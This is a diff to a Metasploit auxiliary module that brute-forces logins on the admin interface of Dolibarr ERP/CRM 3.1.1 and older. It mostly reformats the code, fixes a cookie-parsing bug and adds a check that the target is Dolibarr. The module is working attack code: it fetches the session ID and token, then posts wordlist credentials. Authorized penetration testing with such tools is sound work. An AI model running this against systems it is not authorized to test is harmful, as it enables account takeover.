@@ -1,52 +1,63 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Dolibarr ERP/CRM Login Utility',
-      'Description'    => %q{
-        This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
-        and should only work against version 3.1.1 or older, because these versions do not
-        have any default protections against bruteforcing.
-      },
-      'Author'         => [ 'sinn3r' ],
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Dolibarr ERP/CRM Login Utility',
+        'Description' => %q{
+          This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
+          and should only work against version 3.1.1 or older, because these versions do not
+          have any default protections against brute forcing.
+        },
+        'Author' => [ 'sinn3r' ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
-        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
-        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
+        OptPath.new('USERPASS_FILE', [
+          false, "File containing users and passwords separated by space, one pair per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt")
+        ]),
+        OptPath.new('USER_FILE', [
+          false, "File containing users, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt")
+        ]),
+        OptPath.new('PASS_FILE', [
+          false, "File containing passwords, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
+        ]),
         OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])
-      ], self.class)
+      ]
+    )
   end
-
 
   def get_sid_token
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => normalize_uri(@uri)
+      'uri' => normalize_uri(@uri)
     })
 
     return [nil, nil] if res.nil? || res.get_cookies.empty?
 
     # Get the session ID from the cookie
-    m = get_cookies.match(/(DOLSESSID_.+);/)
+    m = res.get_cookies.match(/(DOLSESSID_.+);/)
     id = (m.nil?) ? nil : m[1]
 
     # Get the token from the decompressed HTTP body response
@@ -99,18 +110,18 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi({
-        'method'   => 'POST',
-        'uri'      => normalize_uri("#{@uri}index.php"),
-        'cookie'   => sid,
+        'method' => 'POST',
+        'uri' => normalize_uri("#{@uri}index.php"),
+        'cookie' => sid,
         'vars_post' => {
-          'token'         => token,
+          'token' => token,
           'loginfunction' => 'loginfunction',
-          'tz'            => '-6',
-          'dst'           => '1',
-          'screenwidth'   => '1093',
-          'screenheight'  => '842',
-          'username'      => user,
-          'password'      => pass
+          'tz' => '-6',
+          'dst' => '1',
+          'screenwidth' => '1093',
+          'screenheight' => '842',
+          'username' => user,
+          'password' => pass
         }
       })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
@@ -137,6 +148,21 @@ class MetasploitModule < Msf::Auxiliary
   def run
     @uri = target_uri.path
     @uri << "/" if @uri[-1, 1] != "/"
+
+    res = send_request_raw({
+      'method' => 'GET',
+      'uri'    => normalize_uri(@uri)
+    })
+
+    unless res
+      print_error("#{peer} - Could not connect to the Dolibarr login page")
+      return
+    end
+
+    unless res.code == 200 && res.body.include?('Dolibarr')
+      print_error("#{peer} - Application does not appear to be Dolibarr. Module will not continue.")
+      return
+    end
 
     super
   end
